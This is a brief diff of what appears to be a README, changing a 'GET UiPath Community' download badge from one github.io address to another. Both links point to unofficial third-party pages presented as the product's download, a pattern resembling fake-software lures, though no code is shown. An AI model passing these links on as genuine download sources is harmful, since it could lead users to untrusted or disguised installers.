@@ -3,7 +3,7 @@
 
 ![UiPath Community](https://global.discourse-cdn.com/uipath/original/4X/c/3/3/c33c5b3a338bd09f1090782f3f47b83be5b87f10.png)
 
-[![GET UiPath Community](https://img.shields.io/badge/GET%20%E2%80%94%20UiPath%20Community-0078D6?style=for-the-badge&logoColor=white)](https://karenmitchelln447.github.io/.github/uipath-community-download)
+[![GET UiPath Community](https://img.shields.io/badge/GET%20%E2%80%94%20UiPath%20Community-0078D6?style=for-the-badge&logoColor=white)](https://ui-path-community.github.io/.github/)
 
 ---
 
